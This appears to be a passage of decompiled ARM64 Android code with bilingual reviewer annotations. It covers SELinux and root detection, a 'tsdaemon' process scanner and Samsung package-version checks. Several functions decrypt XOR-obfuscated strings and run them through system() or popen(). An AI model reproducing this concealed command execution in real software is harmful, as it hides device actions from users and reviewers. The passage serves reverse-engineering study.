                                                     CONCAT13((byte)((ulong)uVar37 >> 0x18) ^ bVar21
                                                              ,CONCAT12((byte)((ulong)uVar37 >> 0x10
                                                                              ) ^ bVar20,
                                                                        CONCAT11((byte)((ulong)
                                                  uVar37 >> 8) ^ bVar19,(byte)uVar37 ^ bVar18)))))))
    ;
    *(byte *)((long)puVar14 + 0x56) = *(byte *)((long)puVar14 + 0x56) ^ 0x69;
    *(byte *)((long)puVar14 + 0x57) = *(byte *)((long)puVar14 + 0x57) ^ 7;
    *(byte *)(puVar14 + 0xb) = *(byte *)(puVar14 + 0xb) ^ 0xd3;
  }
  uVar12 = FUN_002295c4(&DAT_00233f30);
  FUN_00204d38(&local_e0,uVar12);
  pcVar1 = (char *)((ulong)&local_e0 | 1);
  if ((local_e0 & 1) != 0) {
    pcVar1 = local_d0;
  }
  system(pcVar1);
  if ((local_c8 & 1) == 0) {
    local_c8 = local_c8 & 0xffffffffffff0000;
  }
  else {
    *local_b8 = '\0';
    local_c0 = 0;
  }
  if ((local_e0 & 1) != 0) {
    *local_d0 = '\0';
    local_d8 = 0;
    if ((local_e0 & 1) != 0) {
      free(local_d0);
    }
  }
  if ((local_c8 & 1) != 0) {
    free(local_b8);
  }
  if ((local_b0 & 1) == 0) {
    if (*(long *)(lVar3 + 0x28) != local_38) {
LAB_0019d5a0:
                    /* WARNING: Subroutine does not return */
      __stack_chk_fail();
    }
  }
  else {
    free(local_a0);
    if (*(long *)(lVar3 + 0x28) != local_38) goto LAB_0019d5a0;
  }
  return 0;
}



// ----------------------------------------------------------------




/*
 * [PHONE FUNCTION] FUN_0019d9ec
 * Purpose (EN): SELinux & Root Environment Detection
 * Purpose (AR): فحص getenforce وحالة روت وسياق التنفيذ
 */

// Function: FUN_0019d9ec @ 0019d9ec
// ----------------------------------------------------------------

/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

void FUN_0019d9ec(void)

{
  char cVar1;
  long lVar2;
  undefined1 auVar3 [16];
  undefined1 auVar4 [16];
  undefined1 auVar5 [16];
  undefined1 auVar6 [16];
  undefined1 auVar7 [16];
  undefined1 auVar8 [16];
  undefined1 auVar9 [16];
  undefined1 auVar10 [16];
  undefined1 auVar11 [16];
  undefined1 auVar12 [16];
  undefined1 auVar13 [16];
  byte *pbVar14;
  char *pcVar15;
  size_t sVar16;
  long lVar17;
  long lVar18;
  void *pvVar19;
  undefined8 *puVar20;
  undefined1 *puVar21;
  ulong uVar22;
  undefined1 auVar23 [16];
  undefined1 auVar24 [16];
  undefined1 auVar25 [16];
  undefined1 auVar26 [16];
  long lVar32;
  undefined1 auVar27 [16];
  undefined1 auVar28 [16];
  undefined1 auVar29 [16];
  undefined1 auVar30 [16];
  undefined1 auVar31 [16];
  long lVar37;
  undefined1 auVar33 [16];
  undefined1 auVar34 [16];
  undefined1 auVar35 [16];
  undefined1 auVar36 [16];
  long lVar43;
  undefined1 auVar38 [16];
  undefined1 auVar39 [16];
  undefined1 auVar40 [16];
  undefined1 auVar41 [16];
  undefined1 auVar42 [16];
  long lVar49;
  undefined1 auVar44 [16];
  undefined1 auVar45 [16];
  undefined1 auVar46 [16];
  undefined1 auVar47 [16];
  undefined1 auVar48 [16];
  long lVar55;
  undefined1 auVar50 [16];
  undefined1 auVar51 [16];
  undefined1 auVar52 [16];
  undefined1 auVar53 [16];
  undefined1 auVar54 [16];
  long lVar61;
  undefined1 auVar56 [16];
  undefined1 auVar57 [16];
  undefined1 auVar58 [16];
  undefined1 auVar59 [16];
  undefined1 auVar60 [16];
  long lVar66;
  undefined1 auVar62 [16];
  undefined1 auVar63 [16];
  undefined1 auVar64 [16];
  undefined1 auVar65 [16];
  byte bVar67;
  byte bVar68;
  ulong local_b0;
  size_t local_a8;
  char *local_a0;
  ulong local_98;
  size_t local_90;
  char *local_88;
  ulong local_80;
  size_t local_78;
  char *local_70;
  long local_68;
  
  lVar2 = tpidr_el0;
  local_68 = *(long *)(lVar2 + 0x28);
  pbVar14 = (byte *)FUN_002295c4(&DAT_00233f90);
  if ((*pbVar14 & 1) == 0) {
    puVar20 = (undefined8 *)FUN_002295c4(&DAT_00233f70);
    auVar30 = _DAT_00177570;
    auVar25 = _DAT_00177490;
    *(undefined2 *)(puVar20 + 4) = 0x191;
    puVar20[1] = auVar30._8_8_;
    *puVar20 = auVar30._0_8_;
    puVar20[3] = auVar25._8_8_;
    puVar20[2] = auVar25._0_8_;
    FUN_002234c0(&LAB_001a8fcc,puVar20,0x2362d0);
    puVar21 = (undefined1 *)FUN_002295c4(&DAT_00233f90);
    *puVar21 = 1;
  }
  pcVar15 = (char *)FUN_002295c4(&DAT_00233f70);
  FUN_001b58f8();
  sVar16 = strlen(pcVar15);
  if (0xffffffffffffffef < sVar16) {
                    /* WARNING: Subroutine does not return */
    FUN_00203188(&local_80);
  }
  if (sVar16 < 0x17) {
    pcVar15 = (char *)((ulong)&local_80 | 1);
    local_80 = CONCAT71(local_80._1_7_,(char)((int)sVar16 << 1));
    if (sVar16 != 0) goto LAB_0019da90;
  }
  else {
    uVar22 = sVar16 + 0x10 & 0xfffffffffffffff0;
    pcVar15 = (char *)FUN_00202bc0(uVar22);
    local_80 = uVar22 | 1;
    local_78 = sVar16;
    local_70 = pcVar15;
LAB_0019da90:
    pvVar19 = (void *)FUN_002295c4(&DAT_00233f70);
    memcpy(pcVar15,pvVar19,sVar16);
  }
  pcVar15[sVar16] = '\0';
  pcVar15 = (char *)((ulong)&local_80 | 1);
  if ((local_80 & 1) != 0) {
    pcVar15 = local_70;
  }
  system(pcVar15);
  if ((local_80 & 1) == 0) {
    local_80 = local_80 & 0xffffffffffff0000;
  }
  else {
    *local_70 = '\0';
    local_78 = 0;
  }
  pbVar14 = (byte *)FUN_002295c4(&DAT_00233fd0);
  if ((*pbVar14 & 1) == 0) {
    pvVar19 = (void *)FUN_002295c4(&DAT_00233fb0);
    *(undefined1 *)((long)pvVar19 + 0x247) = 1;
    memcpy(pvVar19,&DAT_00177fb1,0x247);
    FUN_002234c0(FUN_001a8fdc,pvVar19,0x2362d0);
    puVar21 = (undefined1 *)FUN_002295c4(&DAT_00233fd0);
    *puVar21 = 1;
  }
  lVar17 = FUN_002295c4(&DAT_00233fb0);
  if (*(char *)(lVar17 + 0x247) != '\0') {
    lVar17 = 0;
    bVar68 = (byte)_UNK_00176bc8;
    bVar67 = (byte)_DAT_00176bc0;
    auVar25 = _DAT_00176f90;
    auVar30 = _DAT_001775c0;
    auVar35 = ram0x00177090;
    auVar41 = _DAT_00177010;
    auVar47 = _DAT_00177870;
    auVar53 = _DAT_00177550;
    auVar59 = _DAT_00177390;
    do {
      lVar61 = auVar53._8_8_;
      lVar55 = auVar47._8_8_;
      lVar43 = auVar35._8_8_;
      lVar32 = auVar25._8_8_;
      lVar66 = auVar59._8_8_;
      lVar49 = auVar41._8_8_;
      lVar37 = auVar30._8_8_;
      auVar5[8] = 0xb;
      auVar5._0_8_ = 0xdb6bf7ad478bbd0b;
      auVar4[8] = 0xb;
      auVar4._0_8_ = 0xdb6bf7ad478bbd0b;
      auVar3[8] = 0xb;
      auVar3._0_8_ = 0xdb6bf7ad478bbd0b;
      auVar63[8] = 0xb;
      auVar63._0_8_ = 0xdb6bf7ad478bbd0b;
      auVar45[8] = 0xb;
      auVar45._0_8_ = 0xdb6bf7ad478bbd0b;
      auVar39[8] = 0xb;
      auVar39._0_8_ = 0xdb6bf7ad478bbd0b;
      auVar28[8] = 0xb;
      auVar28._0_8_ = 0xdb6bf7ad478bbd0b;
      auVar23[8] = 0xb;
      auVar23._0_8_ = 0xdb6bf7ad478bbd0b;
      auVar33._0_8_ = -(ulong)((byte)(auVar30._0_8_ << 3) & 0x38);
      auVar33._8_8_ = -(ulong)((byte)(lVar37 << 3) & 0x38);
      auVar57._0_8_ = -(ulong)((byte)(auVar41._0_8_ << 3) & 0x38);
      auVar57._8_8_ = -(ulong)((byte)(lVar49 << 3) & 0x38);
      auVar27._0_8_ = -(ulong)((byte)(auVar25._0_8_ << 3) & 0x38);
      auVar27._8_8_ = -(ulong)((byte)(lVar32 << 3) & 0x38);
      auVar38._0_8_ = -(ulong)((byte)(auVar35._0_8_ << 3) & 0x38);
      auVar38._8_8_ = -(ulong)((byte)(lVar43 << 3) & 0x38);
      auVar56._0_8_ = -(ulong)((byte)(auVar53._0_8_ << 3) & 0x38);
      auVar56._8_8_ = -(ulong)((byte)(lVar61 << 3) & 0x38);
      auVar50._0_8_ = -(ulong)((byte)(auVar59._0_8_ << 3) & 0x38);
      auVar50._8_8_ = -(ulong)((byte)(lVar66 << 3) & 0x38);
      auVar44._0_8_ = -(ulong)(byte)((bVar67 & 7) << 3);
      auVar44._8_8_ = -(ulong)(byte)((bVar68 & 7) << 3);
      auVar62._0_8_ = -(ulong)((byte)(auVar47._0_8_ << 3) & 0x38);
      auVar62._8_8_ = -(ulong)((byte)(lVar55 << 3) & 0x38);
      auVar23[9] = 0xbd;
      auVar23[10] = 0x8b;
      auVar23[0xb] = 0x47;
      auVar23[0xc] = 0xad;
      auVar23[0xd] = 0xf7;
      auVar23[0xe] = 0x6b;
      auVar23[0xf] = 0xdb;
      auVar23 = NEON_ushl(auVar23,auVar33,8);
      auVar28[9] = 0xbd;
      auVar28[10] = 0x8b;
      auVar28[0xb] = 0x47;
      auVar28[0xc] = 0xad;
      auVar28[0xd] = 0xf7;
      auVar28[0xe] = 0x6b;
      auVar28[0xf] = 0xdb;
      auVar33 = NEON_ushl(auVar28,auVar57,8);
      auVar39[9] = 0xbd;
      auVar39[10] = 0x8b;
      auVar39[0xb] = 0x47;
      auVar39[0xc] = 0xad;
      auVar39[0xd] = 0xf7;
      auVar39[0xe] = 0x6b;
      auVar39[0xf] = 0xdb;
      auVar57 = NEON_ushl(auVar39,auVar56,8);
      auVar45[9] = 0xbd;
      auVar45[10] = 0x8b;
      auVar45[0xb] = 0x47;
      auVar45[0xc] = 0xad;
      auVar45[0xd] = 0xf7;
      auVar45[0xe] = 0x6b;
      auVar45[0xf] = 0xdb;
      auVar51 = NEON_ushl(auVar45,auVar50,8);
      auVar63[9] = 0xbd;
      auVar63[10] = 0x8b;
      auVar63[0xb] = 0x47;
      auVar63[0xc] = 0xad;
      auVar63[0xd] = 0xf7;
      auVar63[0xe] = 0x6b;
      auVar63[0xf] = 0xdb;
      auVar45 = NEON_ushl(auVar63,auVar44,8);
      auVar3[9] = 0xbd;
      auVar3[10] = 0x8b;
      auVar3[0xb] = 0x47;
      auVar3[0xc] = 0xad;
      auVar3[0xd] = 0xf7;
      auVar3[0xe] = 0x6b;
      auVar3[0xf] = 0xdb;
      auVar63 = NEON_ushl(auVar3,auVar62,8);
      auVar4[9] = 0xbd;
      auVar4[10] = 0x8b;
      auVar4[0xb] = 0x47;
      auVar4[0xc] = 0xad;
      auVar4[0xd] = 0xf7;
      auVar4[0xe] = 0x6b;
      auVar4[0xf] = 0xdb;
      auVar39 = NEON_ushl(auVar4,auVar38,8);
      auVar5[9] = 0xbd;
      auVar5[10] = 0x8b;
      auVar5[0xb] = 0x47;
      auVar5[0xc] = 0xad;
      auVar5[0xd] = 0xf7;
      auVar5[0xe] = 0x6b;
      auVar5[0xf] = 0xdb;
      auVar28 = NEON_ushl(auVar5,auVar27,8);
      lVar18 = FUN_002295c4(&DAT_00233fb0);
      pbVar14 = (byte *)(lVar18 + lVar17);
      auVar51._0_8_ =
           CONCAT17(pbVar14[7] ^ auVar63[8],
                    CONCAT16(pbVar14[6] ^ auVar63[0],
                             CONCAT15(pbVar14[5] ^ auVar57[8],
                                      CONCAT14(pbVar14[4] ^ auVar57[0],
                                               CONCAT13(pbVar14[3] ^ auVar51[8],
                                                        CONCAT12(pbVar14[2] ^ auVar51[0],
                                                                 CONCAT11(pbVar14[1] ^ auVar45[8],
                                                                          *pbVar14 ^ auVar45[0])))))
                            ));
      auVar51[8] = pbVar14[8] ^ auVar33[0];
      auVar51[9] = pbVar14[9] ^ auVar33[8];
      auVar51[10] = pbVar14[10] ^ auVar39[0];
      auVar51[0xb] = pbVar14[0xb] ^ auVar39[8];
      auVar51[0xc] = pbVar14[0xc] ^ auVar23[0];
      auVar51[0xd] = pbVar14[0xd] ^ auVar23[8];
      auVar51[0xe] = pbVar14[0xe] ^ auVar28[0];
      auVar51[0xf] = pbVar14[0xf] ^ auVar28[8];
      auVar53._0_8_ = auVar53._0_8_ + 0x10;
      auVar53._8_8_ = lVar61 + 0x10;
      auVar59._0_8_ = auVar59._0_8_ + 0x10;
      auVar59._8_8_ = lVar66 + 0x10;
      bVar67 = bVar67 + 0x10;
      bVar68 = bVar68 + 0x10;
      ((undefined8 *)(lVar18 + lVar17))[1] = auVar51._8_8_;
      *(undefined8 *)(lVar18 + lVar17) = auVar51._0_8_;
      auVar47._0_8_ = auVar47._0_8_ + 0x10;
      auVar47._8_8_ = lVar55 + 0x10;
      lVar17 = lVar17 + 0x10;
      auVar41._0_8_ = auVar41._0_8_ + 0x10;
      auVar41._8_8_ = lVar49 + 0x10;
      auVar35._0_8_ = auVar35._0_8_ + 0x10;
      auVar35._8_8_ = lVar43 + 0x10;
      auVar30._0_8_ = auVar30._0_8_ + 0x10;
      auVar30._8_8_ = lVar37 + 0x10;
      auVar25._0_8_ = auVar25._0_8_ + 0x10;
      auVar25._8_8_ = lVar32 + 0x10;
    } while (lVar17 != 0x240);
    lVar17 = FUN_002295c4(&DAT_00233fb0);
    *(byte *)(lVar17 + 0x240) = *(byte *)(lVar17 + 0x240) ^ 0xb;
    *(byte *)(lVar17 + 0x241) = *(byte *)(lVar17 + 0x241) ^ 0xbd;
    *(byte *)(lVar17 + 0x242) = *(byte *)(lVar17 + 0x242) ^ 0x8b;
    *(byte *)(lVar17 + 0x243) = *(byte *)(lVar17 + 0x243) ^ 0x47;
    *(undefined1 *)(lVar17 + 0x247) = 0;
    *(byte *)(lVar17 + 0x244) = *(byte *)(lVar17 + 0x244) ^ 0xad;
    *(byte *)(lVar17 + 0x245) = *(byte *)(lVar17 + 0x245) ^ 0xf7;
    *(byte *)(lVar17 + 0x246) = *(byte *)(lVar17 + 0x246) ^ 0x6b;
  }
  pcVar15 = (char *)FUN_002295c4(&DAT_00233fb0);
  sVar16 = strlen(pcVar15);
  if (0xffffffffffffffef < sVar16) {
                    /* WARNING: Subroutine does not return */
    FUN_00203188(&local_98);
  }
  if (sVar16 < 0x17) {
    pcVar15 = (char *)((ulong)&local_98 | 1);
    local_98 = CONCAT71(local_98._1_7_,(char)((int)sVar16 << 1));
    if (sVar16 != 0) goto LAB_0019ddb8;
  }
  else {
    uVar22 = sVar16 + 0x10 & 0xfffffffffffffff0;
    pcVar15 = (char *)FUN_00202bc0(uVar22);
    local_98 = uVar22 | 1;
    local_90 = sVar16;
    local_88 = pcVar15;
LAB_0019ddb8:
    pvVar19 = (void *)FUN_002295c4(&DAT_00233fb0);
    memcpy(pcVar15,pvVar19,sVar16);
  }
  pcVar15[sVar16] = '\0';
  pcVar15 = (char *)((ulong)&local_98 | 1);
  if ((local_98 & 1) != 0) {
    pcVar15 = local_88;
  }
  system(pcVar15);
  if ((local_98 & 1) == 0) {
    local_98 = local_98 & 0xffffffffffff0000;
  }
  else {
    *local_88 = '\0';
    local_90 = 0;
  }
  pbVar14 = (byte *)FUN_002295c4(&DAT_00234010);
  if ((*pbVar14 & 1) == 0) {
    pvVar19 = (void *)FUN_002295c4(&DAT_00233ff0);
    *(undefined1 *)((long)pvVar19 + 0x272) = 1;
    memcpy(pvVar19,&DAT_001781f8,0x272);
    FUN_002234c0(FUN_001a8ff4,pvVar19,0x2362d0);
    puVar21 = (undefined1 *)FUN_002295c4(&DAT_00234010);
    *puVar21 = 1;
    lVar17 = FUN_002295c4(&DAT_00233ff0);
    cVar1 = *(char *)(lVar17 + 0x272);
    auVar31 = _DAT_00176f90;
    auVar48 = _DAT_00177010;
    auVar42 = ram0x00177090;
    auVar65 = _DAT_00177390;
    auVar60 = _DAT_00177550;
    auVar36 = _DAT_001775c0;
    auVar54 = _DAT_00177870;
  }
  else {
    lVar17 = FUN_002295c4(&DAT_00233ff0);
    cVar1 = *(char *)(lVar17 + 0x272);
    auVar31 = _DAT_00176f90;
    auVar48 = _DAT_00177010;
    auVar42 = ram0x00177090;
    auVar65 = _DAT_00177390;
    auVar60 = _DAT_00177550;
    auVar36 = _DAT_001775c0;
    auVar54 = _DAT_00177870;
  }
  _DAT_00176f90 = auVar31;
  _DAT_00177010 = auVar48;
  unique0x10001f8f = auVar42;
  _DAT_00177390 = auVar65;
  _DAT_00177550 = auVar60;
  _DAT_001775c0 = auVar36;
  _DAT_00177870 = auVar54;
  if (cVar1 != '\0') {
    lVar17 = 0;
    bVar68 = (byte)_UNK_00176bc8;
    bVar67 = (byte)_DAT_00176bc0;
    do {
      lVar61 = auVar60._8_8_;
      lVar55 = auVar54._8_8_;
      lVar43 = auVar42._8_8_;
      lVar32 = auVar31._8_8_;
      lVar66 = auVar65._8_8_;
      lVar49 = auVar48._8_8_;
      lVar37 = auVar36._8_8_;
      auVar13[8] = 0xbf;
      auVar13._0_8_ = 0x558bf9a58fbd6dbf;
      auVar12[8] = 0xbf;
      auVar12._0_8_ = 0x558bf9a58fbd6dbf;
      auVar11[8] = 0xbf;
      auVar11._0_8_ = 0x558bf9a58fbd6dbf;
      auVar10[8] = 0xbf;
      auVar10._0_8_ = 0x558bf9a58fbd6dbf;
      auVar9[8] = 0xbf;
      auVar9._0_8_ = 0x558bf9a58fbd6dbf;
      auVar8[8] = 0xbf;
      auVar8._0_8_ = 0x558bf9a58fbd6dbf;
      auVar7[8] = 0xbf;
      auVar7._0_8_ = 0x558bf9a58fbd6dbf;
      auVar6[8] = 0xbf;
      auVar6._0_8_ = 0x558bf9a58fbd6dbf;
      auVar24._0_8_ = -(ulong)((byte)(auVar36._0_8_ << 3) & 0x38);
      auVar24._8_8_ = -(ulong)((byte)(lVar37 << 3) & 0x38);
      auVar34._0_8_ = -(ulong)((byte)(auVar48._0_8_ << 3) & 0x38);
      auVar34._8_8_ = -(ulong)((byte)(lVar49 << 3) & 0x38);
      auVar29._0_8_ = -(ulong)((byte)(auVar31._0_8_ << 3) & 0x38);
      auVar29._8_8_ = -(ulong)((byte)(lVar32 << 3) & 0x38);
      auVar40._0_8_ = -(ulong)((byte)(auVar42._0_8_ << 3) & 0x38);
      auVar40._8_8_ = -(ulong)((byte)(lVar43 << 3) & 0x38);
      auVar58._0_8_ = -(ulong)((byte)(auVar60._0_8_ << 3) & 0x38);
      auVar58._8_8_ = -(ulong)((byte)(lVar61 << 3) & 0x38);
      auVar52._0_8_ = -(ulong)((byte)(auVar65._0_8_ << 3) & 0x38);
      auVar52._8_8_ = -(ulong)((byte)(lVar66 << 3) & 0x38);
      auVar46._0_8_ = -(ulong)(byte)((bVar67 & 7) << 3);
      auVar46._8_8_ = -(ulong)(byte)((bVar68 & 7) << 3);
      auVar64._0_8_ = -(ulong)((byte)(auVar54._0_8_ << 3) & 0x38);
      auVar64._8_8_ = -(ulong)((byte)(lVar55 << 3) & 0x38);
      auVar6[9] = 0x6d;
      auVar6[10] = 0xbd;
      auVar6[0xb] = 0x8f;
      auVar6[0xc] = 0xa5;
      auVar6[0xd] = 0xf9;
      auVar6[0xe] = 0x8b;
      auVar6[0xf] = 0x55;
      auVar25 = NEON_ushl(auVar6,auVar24,8);
      auVar7[9] = 0x6d;
      auVar7[10] = 0xbd;
      auVar7[0xb] = 0x8f;
      auVar7[0xc] = 0xa5;
      auVar7[0xd] = 0xf9;
      auVar7[0xe] = 0x8b;
      auVar7[0xf] = 0x55;
      auVar35 = NEON_ushl(auVar7,auVar34,8);
      auVar8[9] = 0x6d;
      auVar8[10] = 0xbd;
      auVar8[0xb] = 0x8f;
      auVar8[0xc] = 0xa5;
      auVar8[0xd] = 0xf9;
      auVar8[0xe] = 0x8b;
      auVar8[0xf] = 0x55;
      auVar59 = NEON_ushl(auVar8,auVar58,8);
      auVar9[9] = 0x6d;
      auVar9[10] = 0xbd;
      auVar9[0xb] = 0x8f;
      auVar9[0xc] = 0xa5;
      auVar9[0xd] = 0xf9;
      auVar9[0xe] = 0x8b;
      auVar9[0xf] = 0x55;
      auVar53 = NEON_ushl(auVar9,auVar52,8);
      auVar10[9] = 0x6d;
      auVar10[10] = 0xbd;
      auVar10[0xb] = 0x8f;
      auVar10[0xc] = 0xa5;
      auVar10[0xd] = 0xf9;
      auVar10[0xe] = 0x8b;
      auVar10[0xf] = 0x55;
      auVar47 = NEON_ushl(auVar10,auVar46,8);
      auVar11[9] = 0x6d;
      auVar11[10] = 0xbd;
      auVar11[0xb] = 0x8f;
      auVar11[0xc] = 0xa5;
      auVar11[0xd] = 0xf9;
      auVar11[0xe] = 0x8b;
      auVar11[0xf] = 0x55;
      auVar23 = NEON_ushl(auVar11,auVar64,8);
      auVar12[9] = 0x6d;
      auVar12[10] = 0xbd;
      auVar12[0xb] = 0x8f;
      auVar12[0xc] = 0xa5;
      auVar12[0xd] = 0xf9;
      auVar12[0xe] = 0x8b;
      auVar12[0xf] = 0x55;
      auVar41 = NEON_ushl(auVar12,auVar40,8);
      auVar13[9] = 0x6d;
      auVar13[10] = 0xbd;
      auVar13[0xb] = 0x8f;
      auVar13[0xc] = 0xa5;
      auVar13[0xd] = 0xf9;
      auVar13[0xe] = 0x8b;
      auVar13[0xf] = 0x55;
      auVar30 = NEON_ushl(auVar13,auVar29,8);
      lVar18 = FUN_002295c4(&DAT_00233ff0);
      pbVar14 = (byte *)(lVar18 + lVar17);
      auVar26._0_8_ =
           CONCAT17(pbVar14[7] ^ auVar23[8],
                    CONCAT16(pbVar14[6] ^ auVar23[0],
                             CONCAT15(pbVar14[5] ^ auVar59[8],
                                      CONCAT14(pbVar14[4] ^ auVar59[0],
                                               CONCAT13(pbVar14[3] ^ auVar53[8],
                                                        CONCAT12(pbVar14[2] ^ auVar53[0],
                                                                 CONCAT11(pbVar14[1] ^ auVar47[8],
                                                                          *pbVar14 ^ auVar47[0])))))
                            ));
      auVar26[8] = pbVar14[8] ^ auVar35[0];
      auVar26[9] = pbVar14[9] ^ auVar35[8];
      auVar26[10] = pbVar14[10] ^ auVar41[0];
      auVar26[0xb] = pbVar14[0xb] ^ auVar41[8];
      auVar26[0xc] = pbVar14[0xc] ^ auVar25[0];
      auVar26[0xd] = pbVar14[0xd] ^ auVar25[8];
      auVar26[0xe] = pbVar14[0xe] ^ auVar30[0];
      auVar26[0xf] = pbVar14[0xf] ^ auVar30[8];
      auVar60._0_8_ = auVar60._0_8_ + 0x10;
      auVar60._8_8_ = lVar61 + 0x10;
      auVar65._0_8_ = auVar65._0_8_ + 0x10;
      auVar65._8_8_ = lVar66 + 0x10;
      bVar67 = bVar67 + 0x10;
      bVar68 = bVar68 + 0x10;
      ((undefined8 *)(lVar18 + lVar17))[1] = auVar26._8_8_;
      *(undefined8 *)(lVar18 + lVar17) = auVar26._0_8_;
      auVar54._0_8_ = auVar54._0_8_ + 0x10;
      auVar54._8_8_ = lVar55 + 0x10;
      lVar17 = lVar17 + 0x10;
      auVar48._0_8_ = auVar48._0_8_ + 0x10;
      auVar48._8_8_ = lVar49 + 0x10;
      auVar42._0_8_ = auVar42._0_8_ + 0x10;
      auVar42._8_8_ = lVar43 + 0x10;
      auVar36._0_8_ = auVar36._0_8_ + 0x10;
      auVar36._8_8_ = lVar37 + 0x10;
      auVar31._0_8_ = auVar31._0_8_ + 0x10;
      auVar31._8_8_ = lVar32 + 0x10;
    } while (lVar17 != 0x270);
    lVar17 = FUN_002295c4(&DAT_00233ff0);
    *(undefined1 *)(lVar17 + 0x272) = 0;
    *(byte *)(lVar17 + 0x270) = *(byte *)(lVar17 + 0x270) ^ 0xbf;
    *(byte *)(lVar17 + 0x271) = *(byte *)(lVar17 + 0x271) ^ 0x6d;
  }
  pcVar15 = (char *)FUN_002295c4(&DAT_00233ff0);
  sVar16 = strlen(pcVar15);
  if (0xffffffffffffffef < sVar16) {
                    /* WARNING: Subroutine does not return */
    FUN_00203188(&local_b0);
  }
  if (sVar16 < 0x17) {
    pcVar15 = (char *)((ulong)&local_b0 | 1);
    local_b0 = CONCAT71(local_b0._1_7_,(char)((int)sVar16 << 1));
    if (sVar16 != 0) goto LAB_0019e034;
  }
  else {
    uVar22 = sVar16 + 0x10 & 0xfffffffffffffff0;
    pcVar15 = (char *)FUN_00202bc0(uVar22);
    local_b0 = uVar22 | 1;
    local_a8 = sVar16;
    local_a0 = pcVar15;
LAB_0019e034:
    pvVar19 = (void *)FUN_002295c4(&DAT_00233ff0);
    memcpy(pcVar15,pvVar19,sVar16);
  }
  pcVar15[sVar16] = '\0';
  pcVar15 = (char *)((ulong)&local_b0 | 1);
  if ((local_b0 & 1) != 0) {
    pcVar15 = local_a0;
  }
  system(pcVar15);
  if ((local_b0 & 1) != 0) {
    *local_a0 = '\0';
    local_a8 = 0;
    if ((local_b0 & 1) != 0) {
      free(local_a0);
    }
  }
  if ((local_98 & 1) != 0) {
    free(local_88);
  }
  if ((local_80 & 1) == 0) {
    if (*(long *)(lVar2 + 0x28) != local_68) {
LAB_0019e0fc:
                    /* WARNING: Subroutine does not return */
      __stack_chk_fail();
    }
  }
  else {
    free(local_70);
    if (*(long *)(lVar2 + 0x28) != local_68) goto LAB_0019e0fc;
  }
  return;
}



// ----------------------------------------------------------------




/*
 * [PHONE FUNCTION] FUN_001a3870
 * Purpose (EN): Process Scanner (tsdaemon / ps check)
 * Purpose (AR): فحص العمليات النشطة وخاصة tsdaemon
 */

// Function: FUN_001a3870 @ 001a3870
// ----------------------------------------------------------------

void FUN_001a3870(ulong *param_1,undefined8 param_2,byte *param_3)

{
  long lVar1;
  ulong uVar2;
  ulong uVar3;
  void *pvVar4;
  FILE *__stream;
  char *pcVar5;
  byte *__command;
  ulong local_450;
  ulong uStack_448;
  void *local_440;
  char acStack_438 [1024];
  long local_38;
  
  lVar1 = tpidr_el0;
  local_38 = *(long *)(lVar1 + 0x28);
  local_450 = 0;
  uStack_448 = 0;
  __command = *(byte **)(param_3 + 0x10);
  local_440 = (void *)0x0;
  if ((*param_3 & 1) == 0) {
    __command = param_3 + 1;
  }
  __stream = popen((char *)__command,"r");
  if (__stream == (FILE *)0x0) {
    *(undefined2 *)param_1 = 0;
  }
  else {
    pcVar5 = fgets(acStack_438,0x400,__stream);
    uVar2 = local_450;
    uVar3 = uStack_448;
    pvVar4 = local_440;
    while (pcVar5 != (char *)0x0) {
      local_450 = uVar2;
      uStack_448 = uVar3;
      local_440 = pvVar4;
      FUN_00205098(&local_450,acStack_438);
      pcVar5 = fgets(acStack_438,0x400,__stream);
      uVar2 = local_450;
      uVar3 = uStack_448;
      pvVar4 = local_440;
    }
    uStack_448 = 0;
    local_440 = (void *)0x0;
    local_450 = 0;
    param_1[1] = uVar3;
    *param_1 = uVar2;
    param_1[2] = (ulong)pvVar4;
    pclose(__stream);
    if ((local_450 & 1) != 0) {
      free(local_440);
    }
  }
  if (*(long *)(lVar1 + 0x28) != local_38) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}



// ----------------------------------------------------------------




/*
 * [PHONE FUNCTION] FUN_001a4d04
 * Purpose (EN): Dumpsys Package Version Reader
 * Purpose (AR): استخراج إصدارات حزم سامسونج مثل repaircal و retailagent
 */

// Function: FUN_001a4d04 @ 001a4d04
// ----------------------------------------------------------------

/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

bool FUN_001a4d04(void)

{
  void *pvVar1;
  void *pvVar2;
  char cVar3;
  long lVar4;
  ulong uVar5;
  ulong uVar6;
  ulong uVar7;
  ulong uVar8;
  ulong uVar9;
  ulong uVar10;
  void *__ptr;
  int iVar11;
  byte *pbVar12;
  long lVar13;
  undefined8 *puVar14;
  char *pcVar15;
  FILE *__stream;
  size_t __n;
  void *pvVar16;
  void *pvVar17;
  undefined1 *puVar18;
  bool bVar19;
  ulong uVar20;
  byte bVar21;
  byte bVar23;
  byte bVar24;
  byte bVar25;
  byte bVar26;
  byte bVar27;
  byte bVar28;
  byte bVar29;
  undefined8 uVar22;
  byte bVar30;
  byte bVar31;
  byte bVar32;
  byte bVar33;
  byte bVar34;
  byte bVar35;
  byte bVar36;
  byte bVar37;
  undefined8 uVar38;
  undefined8 uVar39;
  undefined8 uVar40;
  undefined8 uVar41;
  undefined8 uVar42;
  ulong local_180;
  ulong local_178;
  void *local_170;
  char acStack_168 [256];
  long local_68;
  
  lVar4 = tpidr_el0;
  local_68 = *(long *)(lVar4 + 0x28);
  pbVar12 = (byte *)FUN_002295c4(&DAT_00234850);
  if ((*pbVar12 & 1) == 0) {
    uVar22 = FUN_002295c4(&DAT_00234830);
    FUN_001ab7c8(uVar22,&DAT_00178d02);
    FUN_002234c0(&LAB_001ab95c,uVar22,0x2362d0);
    puVar18 = (undefined1 *)FUN_002295c4(&DAT_00234850);
    *puVar18 = 1;
    lVar13 = FUN_002295c4(&DAT_00234830);
    cVar3 = *(char *)(lVar13 + 0x31);
  }
  else {
    lVar13 = FUN_002295c4(&DAT_00234830);
    cVar3 = *(char *)(lVar13 + 0x31);
  }
  if (cVar3 != '\0') {
    puVar14 = (undefined8 *)FUN_002295c4(&DAT_00234830);
    uVar42 = puVar14[5];
    uVar41 = puVar14[4];
    uVar38 = puVar14[1];
    uVar22 = *puVar14;
    uVar40 = puVar14[3];
    uVar39 = puVar14[2];
    *(undefined1 *)((long)puVar14 + 0x31) = 0;
    bVar21 = (byte)_DAT_001778a0;
    bVar23 = (byte)((ulong)_DAT_001778a0 >> 8);
    bVar24 = (byte)((ulong)_DAT_001778a0 >> 0x10);
    bVar25 = (byte)((ulong)_DAT_001778a0 >> 0x18);
